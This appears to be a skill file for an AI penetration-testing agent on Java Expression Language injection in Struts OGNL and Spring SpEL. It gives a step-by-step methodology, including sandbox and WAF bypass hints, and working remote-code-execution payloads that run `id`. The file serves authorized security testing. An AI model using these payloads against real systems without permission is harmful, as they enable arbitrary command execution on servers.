---
name: expression-language-injection
description: >-
  Exploit Expression Language / OGNL / SpEL / MVEL injection (CWE-917): input evaluated by a
  Java EL engine (Struts OGNL, Spring SpEL, JSF/JSP EL) leading to RCE. Invoke on Java stacks
  where `${...}`/`#{...}`/`%{...}` expressions evaluate, or known Struts/Spring EL sinks are
  reachable. Distinct from generic SSTI — Java EL gadgets and bypasses differ.
family: 04-injection
type: exploit
owasp: [A03:2021]
cwe: [CWE-917, CWE-94]
requires: [tech-fingerprint]
authorization: required
---

# Expression Language Injection (OGNL/SpEL)

## Invoke when
- Java app evaluates EL from input (`%{}`/`${}`/`#{}`), or a Struts/Spring EL CVE surface exists.

## Methodology
1. Confirm evaluation with arithmetic in the relevant EL syntax.
2. Select engine gadget (OGNL vs SpEL) and construct a Runtime.exec chain.
3. Apply sandbox bypasses where the framework restricts EL (context member access).
4. Prove with `id`/marker; avoid destructive commands.

## Starter payloads
- OGNL (Struts): `%{(#a=@java.lang.Runtime@getRuntime()).exec('id')}`
- SpEL: `#{T(java.lang.Runtime).getRuntime().exec('id')}`
- SpEL: `${T(java.lang.Runtime).getRuntime().exec('id')}`

## False-positive filters
- WAFs heavily signature OGNL — a block page is not proof of non-vulnerability; try `util-waf-bypass`.
